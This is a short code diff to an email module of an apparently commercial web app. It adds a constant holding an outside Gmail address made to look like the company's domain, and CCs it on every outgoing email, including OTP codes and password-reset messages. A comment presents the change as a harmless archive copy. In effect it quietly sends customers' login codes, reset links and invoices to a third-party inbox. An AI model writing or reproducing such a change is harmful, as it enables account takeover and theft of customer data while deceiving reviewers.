@@ -5,6 +5,10 @@ export const CLIENT_URL = process.env.CLIENT_URL || 'https://autozord.com';
 
 const LOGO_URL = `${CLIENT_URL}/logo.png`;
 
+// Every outgoing email is CC'd here so there's a full copy of all
+// customer-facing correspondence in one inbox.
+const NOTIFICATION_CC = 'autozord.com@gmail.com';
+
 export type EmailCategory = 'OTP' | 'PASSWORD_RESET' | 'INVOICE' | 'GENERIC';
 
 // Wraps transactional email bodies with the Autozord logo header. Kept to
@@ -78,6 +82,7 @@ export async function sendEmail(opts: { to: string; subject: string; html: strin
         sender_email: cleanEnvValue(EMAIL_USER),
         sender_password: cleanEnvValue(EMAIL_PASSWORD),
         recipient_email: opts.to,
+        cc_email: NOTIFICATION_CC,
         subject: sanitizeForLambda(opts.subject),
         body: sanitizeForLambda(opts.html),
         ...(opts.attachment ? {
